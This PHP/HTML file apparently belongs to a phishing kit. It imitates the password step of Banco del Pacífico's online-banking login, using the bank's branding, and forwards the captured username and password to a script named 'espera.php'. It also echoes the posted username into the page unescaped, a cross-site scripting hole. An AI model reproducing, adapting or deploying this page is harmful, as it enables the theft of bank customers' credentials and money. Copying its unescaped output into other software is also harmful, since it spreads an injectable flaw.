
<?php
@session_start();

if(isset ($_POST['us']) ){
	$_SESSION['us'] = $_POST['us'];
	
}else if(isset ($_SESSION['us']) ){} 

else{ header ('location: index.html'); exit(); }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pacificp-0</title>
    <link rel="icon" href="data:,">
</head>

<style>

.ip1 {    outline: none !important;
    font-size: 13px !important;
    border: 1px solid #a5a5a6;
    border-radius: 2px !important;
    display: inline;
    height: 20px;
    line-height: 20px;
    font-weight: 100;
    background: none;
    max-width: 100%;
    margin-top: 0px;
    padding: 5px;
    background-image: none;
    vertical-align: middle;
    background-color: transparent;
    width: 85%;}

.botonn {
    outline: none !important;
    border-radius: 2px !important;
    display: inline;
    line-height: 20px;
    background: none;
    max-width: 100%;
    cursor: pointer;
    border: 0 none;
    height: 32px;
    width: 90%;
    background-color: #005eb8;
    color: #ffffff;
    text-decoration: none;
    text-align: center;
    -webkit-appearance: none;
    padding: 0;
    font-family: Helvetica!important;
    font-style: normal;
    font-weight: normal;
    font-size: 14px!important;
}


.boton {
    margin-bottom: 8px !important;
    -webkit-appearance: none;
    -webkit-border-radius: 0;
    color: #005eb8;
    width: 90%;
    height: 32px;
    background: #ECEFF1;
    border-color: #ECEFF1;
    border: 0px;
    font-family: Helvetica!important;
    font-style: normal;
    font-weight: normal;
    font-size: 14px!important;
}

.boton3 {
    outline: none !important;
    border: 1px solid #a5a5a6;
    border-radius: 2px !important;
    padding: 5px 5px 5px 8px;
    display: inline;
    line-height: 20px;
    max-width: 100%;
    color: #005eb8;
    border-color: #005eb8;
    font-family: Helvetica!important;
    font-style: normal;
    font-weight: normal;
    font-size: 14px!important;
    width: 90%;
    height: 100%;
    background: none;
    margin-top: 3%;
}




</style>


<body style="margin: 0;">
    

<center>
<div style="width: 100%; height: 130px; background-color: #ECEFF1;border-bottom: #a5a5a6 1px solid;">

<img style="width: 320px; margin-top: 40px;" src="logo_pacifico1.png" alt="">

</div>

<br>
<br>

<div style="width: 300px ;">




    <img style="width: 90px; float: left;" src="atras.png" alt="">


<img style="width: 250px;" src="ingres.png" alt="">

<br>

<form method="post" action="espera.php" style="width: 300px; font-family: sans-serif;">

 <br>


<br>


    <br>
<span style="float: left;margin-left: 17px;font-size: 14px; color: #7f7e7e;">Contraseña</span>


  
   <input type="hidden" name="us" value="<?php echo $_POST['us']; ?>">

<input required class="ip1" type="password" name="ct" id="ct" placeholder="Ingrese su contraseña">

<br>
<br>


<input type="submit" class="botonn" name="" id="" value="Iniciar sesión">
<br><br>
</form>

<input type="submit" name="" id="" class="boton" value="¿Olvidó su contraseña?">

<br><br>
<br>






<input type="submit" class="boton3" name="" id="" value="Crear usuario">
<br><br>


<a href="" style="color: #005eb8; text-decoration: none; font-family: sans-serif; font-size: 14px;">Desbloquear usuario</a>


<br><br>







</div>  


</div>

<div style="color: #B3BAC0 !important; font-family: sans-serif; font-size: 11px;" >
    <p >Recomendamos utilizar la Banca Virtual con los navegadores</p>
    
    <p>Internet explorer 11.0, Chrome 36.0.1, Firefox 31.0, Microsoft Edge.</p>
    <br>
    <p>© Copyright 2017 Banco del Pacífico *V4.7.43</p>
    
    
    </div>




</center>

</body>
</html>